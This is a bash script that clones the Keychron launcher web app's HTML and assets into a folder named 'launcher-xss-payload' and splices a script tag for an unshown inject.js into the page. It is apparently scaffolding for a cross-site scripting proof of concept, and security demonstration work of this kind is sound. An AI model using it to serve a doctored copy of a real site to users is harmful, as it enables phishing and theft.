#!/usr/bin/env bash

# Base URL for the site to clone (you need to set this to the actual site URL)
BASE_URL="https://launcher.keychron.com"  # Replace with the actual URL

mkdir -p launcher-xss-payload/assets/{menu,outline,sound,json}

# First, download the main HTML file
echo "Downloading index.html..."
curl -sSf "$BASE_URL" -o launcher-xss-payload/index.html || {
    echo "Failed to fetch index.html from $BASE_URL"
    exit 1
}

# Copy site assets locally
assets=(
    "956.dae95f0ab3aee5e6.js"
    "590.53d8624929d1e66a.js"
    "590.721164970e0b0d80.js"
    "assets/menu/light.svg"
    "assets/menu/connect.svg"
    "assets/menu/dpi.svg"
    "assets/menu/magnet.svg"
    "assets/menu/keyboard.svg"
    "assets/menu/advance.svg"
    "assets/menu/macro.svg"
    "assets/menu/disconnect.svg"
    "assets/menu/firmware.svg"
    "assets/menu/setting.svg"
    "assets/menu/test.svg"
    "assets/menu/system.svg"
    "assets/menu/bug.svg"
    "assets/menu/mouseM.svg"
    "assets/mac.svg"
    "assets/linux.svg"
    "assets/star.svg"
    "assets/windows.svg"
    "assets/outline/plus.svg"
    "assets/error.svg"
    "assets/keyboard.png"
    "assets/rotate-left.png"
    "assets/safari.png"
    "assets/mouse.png"
    "assets/rotate-right.png"
    "assets/logo.png"
    "assets/sound/Key.mp3"
    "assets/json/keycode-us-mac.json"
    "assets/json/keycode-us-win.json"
    "assets/keyboard/keycap.png"
    "assets/keyboard/enter.png"
    "assets/keyboard/tab.png"
    "assets/keyboard/space.png"
    "runtime.144e0cfe9c3639f.js"
    "polyfills.83069dcda8c306b5.js"
    "main.f8ccf6534b6b4909.js"
    "scripts.d7cc7e2f429b4927.js"
    "runtime.144e0cfe9c363f9f.js"
    "styles.264c1859ef485481.css"
    "595.5fd8a49cbafd63dc.js"
    "804.1a7a54bab411b4e3.js"
    "865.823663b167d28b34.js"
    "558.66e12a9961fd4651.js"
    "assets/vol.svg"
    "favicon.ico"
)

# Fetch each asset
echo "Downloading assets..."
for API_PATH in "${assets[@]}"; do
    LOCAL_PATH="launcher-xss-payload/${API_PATH}"
    REMOTE_URL="${BASE_URL}/${API_PATH}"
    
    # Create directory if it doesn't exist
    mkdir -p "$(dirname "$LOCAL_PATH")"
    
    echo "Fetching: $API_PATH"
    curl -sSf "$REMOTE_URL" -o "$LOCAL_PATH" || echo "Failed to fetch $REMOTE_URL"
done

# Extract and download all scripts from HTML dynamically
echo "Extracting scripts from HTML..."
if [ -f "launcher-xss-payload/index.html" ]; then
    # Extract all script src attributes from the HTML
    SCRIPT_SRCS=$(grep -oE 'src="[^"]*\.js[^"]*"' launcher-xss-payload/index.html | sed 's/src="//g' | sed 's/"//g' | grep -v "^https://")
    
    echo "Found scripts in HTML:"
    for SCRIPT_SRC in $SCRIPT_SRCS; do
        echo "  - $SCRIPT_SRC"
        LOCAL_PATH="launcher-xss-payload/${SCRIPT_SRC}"
        REMOTE_URL="${BASE_URL}/${SCRIPT_SRC}"
        
        # Create directory if it doesn't exist
        mkdir -p "$(dirname "$LOCAL_PATH")"
        
        echo "Fetching script: $SCRIPT_SRC"
        curl -sSf "$REMOTE_URL" -o "$LOCAL_PATH" || echo "Failed to fetch $REMOTE_URL"
    done
else
    echo "index.html not found, skipping script extraction"
fi

# Inject script (warning message is included in inject.js)
echo "Injecting script into HTML..."
if [[ "$OSTYPE" == "darwin"* ]]; then
    sed -i '' -e 's|</body>|<script src="inject.js"><\/script>\
</body>|g' launcher-xss-payload/index.html
else
    sed -i -e 's|</body>|<script src="inject.js"><\/script>\
</body>|g' launcher-xss-payload/index.html
fi

cp inject.js launcher-xss-payload

echo "Site cloning completed!"